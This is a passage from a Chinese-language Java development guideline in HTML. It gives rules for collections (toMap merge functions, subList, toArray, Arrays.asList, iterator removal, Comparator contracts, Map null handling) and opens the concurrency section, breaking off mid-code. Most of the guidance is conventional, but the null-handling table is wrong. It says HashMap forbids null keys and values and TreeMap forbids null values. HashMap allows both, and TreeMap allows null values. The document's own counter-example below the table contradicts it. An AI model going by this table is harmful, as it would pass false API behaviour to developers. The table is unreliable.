<li>如果自定义对象作为 Map 的键，那么必须覆写 hashCode 和 equals。</li>
</ul>
<p><font color=" #977C00">说明：</font>String 因为覆写了 hashCode 和 equals 方法，所以可以愉快地将 String 对象作为 key 来使用。</p>
</li>
<li>
<p><font color=" #C00000">【强制】</font>判断所有集合内部的元素是否为空，使用 isEmpty()方法，而不是 size()==0 的方式。</p>
<p><font color=" #977C00">说明：</font>在某些集合中，前者的时间复杂度为 O(1)，而且可读性更好。</p>
<p><font color="#019858">正例：</font></p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">Map</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">&gt;</span></span> map <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span>map<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"no element in this map."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
</li>
<li>
<p><font color=" #C00000">【强制】</font>在使用 java.util.stream.Collectors 类的 toMap()方法转为 Map 集合时，一定要使用含有参数<code>BinaryOperator&lt;U&gt; mergeFunction</code> 的方法，用于说明key重复时的策略，否则当出现相同 key 值时会抛出 IllegalStateException 异常。</p>
<p><font color=" #977C00">说明：</font>参数 mergeFunction 的作用是当出现 key 重复时，自定义对 value 的处理策略。</p>
<p><font color="#019858">正例：</font></p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Pair</span><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">,</span> <span class="token class-name">Double</span><span class="token punctuation">&gt;</span><span class="token punctuation">&gt;</span></span> pairArrayList <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
pairArrayList<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Pair</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token string">"version"</span><span class="token punctuation">,</span> <span class="token number">12.10</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
pairArrayList<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Pair</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token string">"version"</span><span class="token punctuation">,</span> <span class="token number">12.19</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
pairArrayList<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Pair</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token string">"version"</span><span class="token punctuation">,</span> <span class="token number">6.28</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">//  生成的 map 集合中只有一个键值对：{version=6.28}</span>
<span class="token class-name">Map</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">,</span> <span class="token class-name">Double</span><span class="token punctuation">&gt;</span></span> map <span class="token operator">=</span> pairArrayList<span class="token punctuation">.</span><span class="token function">stream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">collect</span><span class="token punctuation">(</span>
        <span class="token class-name">Collectors</span><span class="token punctuation">.</span><span class="token function">toMap</span><span class="token punctuation">(</span><span class="token class-name">Pair</span><span class="token operator">::</span><span class="token function">getKey</span><span class="token punctuation">,</span> <span class="token class-name">Pair</span><span class="token operator">::</span><span class="token function">getValue</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>v1<span class="token punctuation">,</span> v2<span class="token punctuation">)</span> <span class="token operator">-&gt;</span> v2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>map<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><font color=" #FF4500">反例：</font></p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> departments <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">"iERP"</span><span class="token punctuation">,</span> <span class="token string">"iERP"</span><span class="token punctuation">,</span> <span class="token string">"EIBU"</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
<span class="token comment">//  抛出 IllegalStateException 异常</span>
<span class="token class-name">Map</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">&gt;</span></span> map <span class="token operator">=</span> <span class="token class-name">Arrays</span><span class="token punctuation">.</span><span class="token function">stream</span><span class="token punctuation">(</span>departments<span class="token punctuation">)</span>
        <span class="token punctuation">.</span><span class="token function">collect</span><span class="token punctuation">(</span><span class="token class-name">Collectors</span><span class="token punctuation">.</span><span class="token function">toMap</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token operator">::</span><span class="token function">hashCode</span><span class="token punctuation">,</span> str <span class="token operator">-&gt;</span> str<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
</li>
<li>
<p><font color=" #C00000">【强制】</font>在使用 java.util.stream.Collectors 类的 toMap()方法转为 Map 集合时，一定要注意当 value 为 null 时会抛 NPE 异常。</p>
<p><font color=" #977C00">说明：</font>在 java.util.HashMap 的 merge 方法里会进行如下的判断：</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">if</span> <span class="token punctuation">(</span>value <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token operator">||</span> remappingFunction <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> 
    <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">NullPointerException</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p><font color=" #FF4500">反例：</font></p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Pair</span><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">,</span> <span class="token class-name">Double</span><span class="token punctuation">&gt;</span><span class="token punctuation">&gt;</span></span> pairArrayList <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
pairArrayList<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Pair</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token string">"version1"</span><span class="token punctuation">,</span> <span class="token number">8.3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
pairArrayList<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Pair</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token string">"version2"</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">//  抛出 NullPointerException 异常</span>
<span class="token class-name">Map</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">,</span> <span class="token class-name">Double</span><span class="token punctuation">&gt;</span></span> map <span class="token operator">=</span> pairArrayList<span class="token punctuation">.</span><span class="token function">stream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">collect</span><span class="token punctuation">(</span>
        <span class="token class-name">Collectors</span><span class="token punctuation">.</span><span class="token function">toMap</span><span class="token punctuation">(</span><span class="token class-name">Pair</span><span class="token operator">::</span><span class="token function">getKey</span><span class="token punctuation">,</span> <span class="token class-name">Pair</span><span class="token operator">::</span><span class="token function">getValue</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>v1<span class="token punctuation">,</span> v2<span class="token punctuation">)</span> <span class="token operator">-&gt;</span> v2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
</li>
<li>
<p><font color=" #C00000">【强制】</font>ArrayList 的 subList 结果不可强转成 ArrayList，否则会抛出 ClassCastException 异 常：<code>java.util.RandomAccessSubList cannot be cast to java.util.ArrayList</code></p>
<p><font color=" #977C00">说明：</font>==subList()返回的是 ArrayList 的内部类 SubList==，并不是  ArrayList 本身，而是 ArrayList  的一个视 图，对于 SubList 的所有操作最终会反映到原列表上。</p>
</li>
<li>
<p><font color=" #C00000">【强制】</font>使用 Map 的方法<code> keySet()/values()/entrySet()</code>返回集合对象时，不可以对其进行添加元素操作，否则会抛出 UnsupportedOperationException 异常。</p>
</li>
<li>
<p><font color=" #C00000">【强制】</font>Collections 类返回的对象，如：<code>emptyList()/singletonList()</code>等都是 immutable list， 不可对其进行添加或者删除元素的操作。</p>
<p><font color=" #FF4500">反例：</font>如果查询无结果，返回 Collections.emptyList() 空集合对象，调用方一旦进行了添加元素的操作，就会触发 UnsupportedOperationException 异常。</p>
</li>
<li>
<p><font color=" #C00000">【强制】</font>在 subList 场景中，<font color="#0000FF">高度注意</font>对父集合元素的增加或删除，均会导致子列表的遍历、 增加、删除产生 ConcurrentModificationException  异常。</p>
</li>
<li>
<p><font color=" #C00000">【强制】</font>使用集合转数组的方法，必须使用集合的 toArray(T[] array)，传入的是类型完全一 致、长度为 0 的空数组。</p>
<p><font color=" #FF4500">反例：</font>直接使用 toArray 无参方法存在问题，此方法返回值只能是 Object[]类，若强转其它类型数组将出现 ClassCastException 错误。</p>
<p><font color="#019858">正例：</font></p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">&gt;</span></span> list <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
list<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"guan"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
list<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"bao"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> array <span class="token operator">=</span> list<span class="token punctuation">.</span><span class="token function">toArray</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p><font color=" #977C00">说明：</font>使用 toArray 带参方法，数组空间大小的 length</p>
<p>1） <font color="#0000FF">等于 0</font>，动态创建与 size 相同的数组，性能最好。</p>
<p>2）  <font color="#0000FF">大于 0 但小于 size</font>，重新创建大小等于 size 的数组，增加 GC 负担。</p>
<p>3）  <font color="#0000FF">等于 size</font>，在高并发情况下，数组创建完成之后，size 正在变大的情况下，负面影响与 2 相同。</p>
<p>4）  <font color="#0000FF">大于 size</font>，空间浪费，且在 size 处插入 null 值，存在 NPE 隐患。</p>
</li>
<li>
<p><font color=" #C00000">【强制】</font>在使用 Collection 接口任何实现类的 addAll()方法时，都要对输入的集合参数进行 NPE 判断。</p>
<p><font color=" #977C00">说明：</font>在 ArrayList#addAll 方法的第一行代码即 Object[] a = c.toArray(); 其中 c 为输入集合参数，如果 为 null，则直接抛出异常。</p>
</li>
<li>
<p><font color=" #C00000">【强制】</font>使用工具类 Arrays.asList()把数组转换成集合时，不能使用其修改集合相关的方法， 它的 <code>add/remove/clear</code> 方法会抛出 UnsupportedOperationException 异常。</p>
<p><font color=" #977C00">说明：</font>==asList 的返回对象是一个 Arrays 内部类，并没有实现集合的修改方法。Arrays.asList 体现的是适配器模式，只是转换接口，后台的数据仍是数组==</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> str <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">"chen"</span><span class="token punctuation">,</span> <span class="token string">"yang"</span><span class="token punctuation">,</span> <span class="token string">"hao"</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
<span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">&gt;</span></span> list <span class="token operator">=</span> <span class="token class-name">Arrays</span><span class="token punctuation">.</span><span class="token function">asList</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// 第一种情况：list也会随之修改，反之亦然。</span>
str<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"change"</span><span class="token punctuation">;</span>
<span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>list<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// 第二种情况：运行时异常</span>
list<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"yangguanbao"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
</li>
<li>
<p><font color=" #C00000">【强制】</font>泛型通配符<code>&lt;? extends T&gt;</code>来接收返回的数据，此写法的泛型集合不能使用 add 方法， 而<code>&lt;? super T&gt;</code>不能使用 get 方法，两者在接口调用/赋值的场景中容易出错。</p>
<p><font color=" #977C00">说明：</font>扩展说一下 ==PECS(Producer Extends Consumer Super)原则==</p>
<p>第一、频繁往外读取内容的，适合用 &lt;? extends T&gt;</p>
<p>第二、经常往里插入的，适合用&lt;? super T&gt;</p>
</li>
<li>
<p><font color=" #C00000">【强制】</font>在无泛型限制定义的集合赋值给泛型限制的集合时，在使用集合元素时，需要进行 instanceof 判断，避免抛出 ClassCastException 异常。</p>
<p><font color=" #977C00">说明：</font>毕竟泛型是在 JDK5 后才出现，考虑到向前兼容，编译器是允许非泛型集合与泛型集合互相赋值。</p>
<p><font color=" #FF4500">反例：</font></p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">&gt;</span></span> generics <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
<span class="token class-name">List</span> notGenerics <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
notGenerics<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
notGenerics<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Integer</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
generics <span class="token operator">=</span> notGenerics<span class="token punctuation">;</span>
<span class="token comment">//  此处抛出 ClassCastException 异常</span>
<span class="token class-name">String</span> string <span class="token operator">=</span> generics<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
</li>
<li>
<p><font color=" #C00000">【强制】</font>不要在 foreach 循环里进行元素的 remove/add 操作。remove 元素请使用 Iterator 方式，如果并发操作，需要对 Iterator 对象加锁。</p>
<p><font color="#019858">正例：</font></p>
 <pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">&gt;</span></span> list <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
list<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
list<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"2"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token class-name">Iterator</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">&gt;</span></span> iterator <span class="token operator">=</span> list<span class="token punctuation">.</span><span class="token function">iterator</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">while</span> <span class="token punctuation">(</span>iterator<span class="token punctuation">.</span><span class="token function">hasNext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token class-name">String</span> item <span class="token operator">=</span> iterator<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>删除元素的条件<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        iterator<span class="token punctuation">.</span><span class="token function">remove</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><font color=" #FF4500">反例：</font></p>
 <pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">String</span> item <span class="token operator">:</span> list<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>item<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token comment">// 正常remove</span>
        list<span class="token punctuation">.</span><span class="token function">remove</span><span class="token punctuation">(</span>item<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><font color=" #977C00">说明：</font>以上代码的执行结果肯定会出乎大家的意料，那么试一下把“1”换成“2”，会是同样的结果吗？</p>
</li>
<li>
<p><font color=" #C00000">【强制】</font>在 JDK7 版本及以上，Comparator 实现类要满足如下三个条件，不然 Arrays.sort， Collections.sort 会抛 IllegalArgumentException 异常。</p>
<p><font color=" #977C00">说明：</font>三个条件如下</p>
<p>1）  x，y 的比较结果和 y，x 的比较结果相反。</p>
<p>2）  x&gt;y，y&gt;z，则 x&gt;z。</p>
<p>3）  x=y，则 x，z 比较结果和 y，z 比较结果相同。</p>
<p><font color=" #FF4500">反例：</font>下例中没有处理相等的情况，交换两个对象判断结果并不互反，不符合第一个条件，在实际使用中    可能会出现异常。</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">new</span> <span class="token class-name">Comparator</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Student</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">compare</span><span class="token punctuation">(</span><span class="token class-name">Student</span> o1<span class="token punctuation">,</span> <span class="token class-name">Student</span> o2<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> o1<span class="token punctuation">.</span><span class="token function">getId</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&gt;</span> o2<span class="token punctuation">.</span><span class="token function">getId</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token number">1</span> <span class="token operator">:</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
</li>
<li>
<p><font color=" #FFC000">【推荐】</font>集合泛型定义时，在 JDK7 及以上，使用 diamond 语法或全省略。</p>
<p><font color=" #977C00">说明：</font>菱形泛型，即 diamond，直接使用&lt;&gt;来指代前边已经指定的类型。</p>
<p><font color="#019858">正例：</font></p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">&gt;</span></span> userCache <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//  全省略方式</span>
<span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">User</span><span class="token punctuation">&gt;</span></span> users <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
</li>
<li>
<p><font color=" #FFC000">【推荐】</font>集合初始化时，指定集合初始值大小。</p>
<p><font color=" #977C00">说明：</font>HashMap 使用 <code>HashMap(int initialCapacity) </code> 初始化，如果暂时无法确定集合大小，那么指定默 认值（16）即可。</p>
<p><font color="#019858">正例：</font>==initialCapacity = (需要存储的元素个数  /  负载因子) + 1==。注意负载因子（即 loader factor）默认 为 0.75，如果暂时无法确定初始值大小，请设置为 16（即默认值）。</p>
<p><font color=" #FF4500">反例：</font>  HashMap 需要放置 1024 个元素，由于没有设置容量初始大小，随着元素增加而被迫不断扩容， resize()方法总共会调用 8 次，反复重建哈希表和数据迁移。当放置的集合元素个数达千万级时会影响程序性能。</p>
</li>
<li>
<p><font color=" #FFC000">【推荐】</font>使用 entrySet 遍历 Map 类集合 KV，而不是 keySet 方式进行遍历</p>
<p><font color=" #977C00">说明：</font>keySet 其实是遍历了 2 次，一次是转为 Iterator 对象，另一次是从 hashMap 中取出 key 所对应的 value。而 entrySet 只是遍历了一次就把 key 和 value 都放到了 entry 中，效率更高。如果是 JDK8，使用 Map.forEach 方法。</p>
<p><font color="#019858">正例：</font>values()返回的是 V值集合，是一个 list 集合对象；keySet()返回的是 K值集合，是一个 Set 集合对象；entrySet()返回的是 K-V值组合集合。</p>
</li>
<li>
<p><font color=" #FFC000">【推荐】</font>高度注意 Map 类集合 K/V 能不能存储 null 值的情况，如下表格：</p>
<table>
<thead>
<tr>
<th>集合类</th>
<th>Key</th>
<th>Value</th>
<th>Super</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>Hashtable</td>
<td><font color="red">不允许为 null</font></td>
<td><font color="red">不允许为 null</font></td>
<td>Dictionary</td>
<td>线程安全</td>
</tr>
<tr>
<td>ConcurrentHashMap</td>
<td><font color="red">不允许为 null</font></td>
<td><font color="red">不允许为 null</font></td>
<td>AbstractMap</td>
<td>锁分段技术（JDK8:CAS）</td>
</tr>
<tr>
<td>TreeMap</td>
<td><font color="red">不允许为 null</font></td>
<td><font color="blue">不允许为 null</font></td>
<td>AbstractMap</td>
<td>线程不安全</td>
</tr>
<tr>
<td>HashMap</td>
<td><font color="blue">不允许为 null</font></td>
<td><font color="blue">不允许为 null</font></td>
<td>AbstractMap</td>
<td>线程不安全</td>
</tr>
</tbody>
</table>
<p><font color=" #FF4500">反例：</font>由于 HashMap 的干扰，很多人认为 ConcurrentHashMap 是可以置入 null 值，而事实上，存储 null 值时会抛出 NPE 异常。</p>
</li>
<li>
<p><font color="#76923C">【参考】</font>合理利用好集合的有序性(sort)和稳定性(order)，避免集合的无序性(unsort)和不稳 定性(unorder)带来的负面影响。</p>
<p><font color=" #977C00">说明：</font>有序性是指遍历的结果是按某种比较规则依次排列的。稳定性指集合每次遍历的元素次序是一定的。 如：ArrayList 是 order/unsort；HashMap 是 unorder/unsort；TreeSet 是 order/sort。</p>
</li>
<li>
<p><font color="#76923C">【参考】</font>利用 Set 元素唯一的特性，可以快速对一个集合进行去重操作，避免使用 List 的 contains()进行遍历去重或者判断包含操作。</p>
</li>
</ol>
<h2 id="七-并发处理">(七)  并发处理</h2>
<ol>
<li>
<p><font color=" #C00000">【强制】</font>获取单例对象需要保证线程安全，其中的方法也要保证线程安全。</p>
<p><font color=" #977C00">说明：</font>资源驱动类、工具类、单例工厂类都需要注意。</p>
</li>
<li>
<p><font color=" #C00000">【强制】</font>创建线程或线程池时请指定有意义的线程名称，方便出错时回溯。</p>
<p><font color="#019858">正例：</font>自定义线程工厂，并且根据外部特征进行分组，比如，来自同一机房的调用，把机房编号赋值给 whatFeatureOfGroup</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">UserThreadFactory</span> <span class="token keyword">implements</span> <span class="token class-name">ThreadFactory</span> <span class="token punctuation">{</span>
    <span class="token keyword">private</span> <span class="token keyword">final</span> <span class="token class-name">String</span> namePrefix<span class="token punctuation">;</span>
    <span class="token keyword">private</span> <span class="token keyword">final</span> <span class="token class-name">AtomicInteger</span> nextId <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">AtomicInteger</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">//  定义线程组名称，在利用 jstack 来排查问题时，非常有帮助</span>
    <span class="token class-name">UserThreadFactory</span><span class="token punctuation">(</span><span class="token class-name">String</span> whatFeatureOfGroup<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        namePrefix <span class="token operator">=</span> <span class="token string">"From UserThreadFactory's "</span> <span class="token operator">+</span> whatFeatureOfGroup <span class="token operator">+</span> <span class="token string">"-Worker-"</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">public</span> <span class="token class-name">Thread</span> <span class="token function">newThread</span><span class="token punctuation">(</span><span class="token class-name">Runnable</span> task<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token class-name">String</span> name <span class="token operator">=</span> namePrefix <span class="token operator">+</span> nextId<span class="token punctuation">.</span><span class="token function">getAndIncrement</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Thread</span> thread <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Thread</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">,</span> task<span class="token punctuation">,</span> name<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
